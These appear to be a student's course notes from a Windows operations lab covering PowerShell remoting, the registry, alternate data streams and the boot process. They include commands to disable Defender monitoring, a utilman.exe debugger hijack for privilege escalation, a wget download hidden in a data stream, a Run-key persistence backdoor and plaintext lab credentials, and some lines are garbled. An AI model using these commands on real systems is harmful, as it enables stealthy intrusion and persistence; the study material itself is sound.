LOGIN/DAILY SUTFF:
ssh student@10.50.38.82 -Y      (LIN-OPS)   # linop=
xfreerdp /u:student /v:10.50.36.193 /dynamic-resolution +glyph-cache +clipboard   (WIN-OPS)
xfreerdp /u:student /v:10.50.39.203 /dynamic-resolution +glyph-cache +clipboard    (Admin-Station; student:password)
                    File-server (ssh) :10.19.0.3 (andy.dwyer:BurtMacklinFBI)
                    
CTFD: http://10.50.22.25:8000/


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
QoL Notes:
Start-Transcript -path .\Day1_notes.txt -append       ### save every command and output typed in powershell to new file
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY1: POWERHSLL BASICS
https://os.cybbh.io/public/os/latest/002_powershell/pwsh_fg.html

Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles'   # Queries current network profiles.

Remoting Security:
Get-Item WSMan:\localhost\client\TrustedHosts                                      # Query trusted hosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server01"                    # Adding a single item to TrustedHosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server01,Server02,127.0.0.1"      # Adding multiple items
                                                     
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server03" -Concatenate       # Appends the Value instead of changing it

#temp session:
Invoke-Command -ComputerName File-Server {Get-Service}                                      # Creates 1-to-1 Temporary Session
Invoke-Command -ComputerName File-Server,Domain-Controll,Workstation2 {Get-Service} -asjob  # Running a Temporary Session as a Job 
                                                                        C:\'location of script on our PC'   ; copies over that script to those computers, 
                                                                            executes and displays results on our screen
Receive-Job <job #>                                                                         # Displays the job's Results


new-pssession -computername (-port -name -credential)   ### like ssh to another PC      (name, fqdn, netbios, servername)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

DAY2: WINDOWS REGISTRY
https://os.cybbh.io/public/os/latest/004_windows_registry/reg_fg.html
regedit


Creating new registies in PWSH: Recommended
Set-MpPreference -DisableRealtimeMonitoring $TRUE
new-item "registry path" -name ".fuk " -force -ErrorAction SilentlyContinue
new-itemproperty "registry path\.fuk" -name '(Default)' -PropertyType String -Value 'exefile' -Force -ErrorAction SilentlyContinue | out-null
new-itemproperty "registry path\.fuk" -name 'Content Type' -propertytype String -Value 'application/x-msdownload' -force -ErrorAction Silentlycontinue | out-null

get-item "new registry path"

Querying:
gci           gets the subkeys, ex 'gci HKLM:\'     'gxi HKLM:\ -recurse' get everything and data/properties
get-itemproperty    
get-item        just the key and not any subitems only entries, ex 'get-item HKLM:\'

Modifying:
set-itemproperty        Set-ISER is the copy of the logged in userâ€™s registemProperty -path <keypath> -name " " -Value " " ; leaves less logs than new-itemproperty (same syntax with new-itemproperty, leaves logs by default   )
remove-itemproperty

get-psdrive         # to see mounts, includes registry roots/hivekeys
add-content -value "new-psdrive -name HKU -psprovider Registry -root HKEY_Users" $profile.AllUsersAllhosts   # mounts that key
^ stuff outside the quotes permanetly adds it                                     &$profile.allusersallhosts
get-item -path registry::Key_Users\*\<path>     # gets all the users info of that path
                HKU:\*\path       ^ does the same thing, but without creating the new psdrive







Using 'reg': Not recommended
reg /?                    #Displays help for all of the reg.exe commands
reg query /?              #Displays help for the `reg query`
reg add /?                #Displays help for `reg add`
reg delete /?             #Displays help for `reg delete`

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme /t REG_SZ /d C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                                                           /v ;name  /t ; datatype/propertytype /d ; directory that you want the registry to run
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme




Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
  ### shows all the users who logged in

Priv Esc1:
Set-MpPreference -DisableRealtimeMonitoring $TRUE     ### do this first to allow this 
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
  ###new key 'utilman.exe'; stringvalue 'Debugger; modify, valuedata: C:\Windows\System32\cmd.exe 
                                  ###means of persistence, inherits users priv, useful for priv esc,  ->.ie lock the screen then open ease of use
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Alternate Data Streams:
## doesnt acutally modify og file directly, the md5 doesnt change

CMD:
ex1: C:\windows\system32>echo social security numbers > reminder.txt:secret.info
ex2: 
  echo "text" > <file>:<streamfile>     ###creates alt data stream
  notepad <file>:<streamfile>   #views content  
'dir /R' displays the ADS info of a file typically hidden


PWSH: 
ex1: set-Content .\reminder.txt -Value "social security numbers" -Stream secret.info 
PS Get-Item reminder.txt -Stream *  Get-Item with the -Stream option allows us to see 
                                                         all streams for *reminder.txt.
ex2:
  get-item <file> -Stream * or <ads file>
  gci <path> | foreach-object {get-item $_.FullName -Stream *} | where {$_.Stream -ne $DATA} } | get-content
  set-content <path> -Value "txt" -Stream <ads file>
  
add-content -passthru <path> -value 'wget IPADDr:445/file.exe -outfile 'location of file to put' 
persistence:
new-itemproperty -path HKLM...currentversion\run -name 'name' -propertytype String -value 'C:\powerhsell.exe' -windowstyle hidden - noprofile -command "Get-content C:\uploaded backdoor" -stream script | foreach { powershell -windowstyle hidden -noprofile $_ } " -force -erroraction silentlycontinue
                        HKEY_Users...^


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY4: WINDOWS BOOT PROCESS AND BCD EDIT

Rookit    ### malware tha thide themselves and other applications, typically in kernel mode
Bootkit   ### replaces the OS bootloader to load the bootkit b4 the OS


BOOT:
  https://git.cybbh.space/os/public/raw/master/images/winboot-01.jpg
  https://git.cybbh.space/os/public/raw/master/images/BIOSvsUEFI.png
  Basic pre-boot and boot
    POST - UEFI - GPT - bootmgrfw.efi - BCD - OS Loader/Winloadefi/winresume.efi/ NTOSKRNL
    POST - BIOS - MBR - Volume Boot Sector - Bootloader/bootmgr.exe/ntldr.exe - boot.ini - NTOKRNL

POST (power on self test) first, checks for hardware required for the system to run.
BIOS will only use MBR, UEFI will only use GPT(GUID Partition Table)
UEFI faster than BIOs, easier to update/ptach. Secure Boot: which only allows verified drivers to load. Supports larger drives.

BIOS loads MBR, first 512 bytes. 1 partition table; can only have up to 4 partitions active. Contains disk partitions. 
UEFI reads EFI partition with boot managers. bootmgrfw.efi tells UEFI where the GPT is at.

BIOS winload.exe (cold starts), winresume.exe
    Both have Ntoskrnl.exe
UEFI winload.efi, winresume.efi( hibernation, needs hiberfil.sys to exsist)
      Fast Boots only works for Shutdowns, not restarts
 
After boot managers load winload/winresume, Ntoskrnl starts several kernal/OS processes:
  device drivers, pagefile.sys, directory hives, hal.dll, process manager for system idle process. And smss.exe and csrss.exe for logon etc.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Win 10 LOGON Process:
https://git.cybbh.space/os/public/raw/master/images/winboot-06.jpg

SYSTEM (pid 4 ), begins this, Idle ( pid 0) is the kernel
PId 0-1000 is systemlevel; for users only smss, csrss and winlogon is only under 1000
Session 0 is for security and high privilege processes such as services (non-interactive)
User subsystem Session 0:

    -smss.exe installs the Win32 subsystem kernel and user mode components (win32k.sys - kernel; winsrv.dll - user; and csrss.exe - user.)
        -csrss.exe - the Client/Server Runtime Subsystem: supports process / thread creation and management. Subsystem processes, like kernel32, user32m, advapi32, win32k.ysy(kernel mode),.dlls.
        -wininit.exe marks itself as critical, initializes the Windows temp directory, loads the rest of the registry, and starts user mode scheduling. It also installs programs that require a reboot to finish the install process. It also starts:
            lsm.exe - the Local Session Manager (LSM): handles all sessions of a system (both remote desktop sessions and local system sessions.)
            lsass.exe - the Local Security Authority Subsystem (LSASS): provides user authentication services, manages the local security policy, and generates access tokens.
            services.exe the Services Control Manager (SCM) loads AutoStart services, using LSASS to authenticate if they run as something other than System.
        -wininit.exe then waits for system shutdown to undo everything it started. 

Session 1 is for the first interactive user (interactive)
User subsystem Session 1:

    Spawn a Session 1 ( or higher) csrss.exe ( each user has one)
    Spawn Winlogon.exe which by default prompts for credentials with logonui.exe      ### service accounts do not have this
         Spawn userinit.exe which creates an account token and creates a custom environment     ### userinit, lauches explorer and kills userinit, has pid of userinit
             Spawn explorer.exe as the customized graphical environment.

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
BCDEDIT:
Native CLI tool to view and manipulate boot configs
  Windows Boot Loader: identifier {current}, the running boot
  
bcdedit /?
bcdedit | findstr /i winload or winresume     ### shows if loaded from cold or hibernation; BIOS or UEFI
msinfo32      ### shows sys summary, devies, boot devices, BIOS mode (UEFI/Legacy), secure boot state
    Boot Device	\Device\HarddiskVolume1
bcdedit /set description "Win 10"   ### changes it
bcdedit /set safeboot minimal/Network     #the former allows safe mode; "Netowkr" allows a basic command shell and network resources like a NIC
bcdedit /set safebootalternateshell   ### allows safe mode to load bash; if no safeboot default is minimal
bcdedit /deletevalue safeboot/sasfebootalternateshell
  -OR-
    msconfig, Boot -> safeboot... (if gui is accessable) 
      uncheck services, custom ones are noted


bcdedit /displayorder {name} /addfirst





















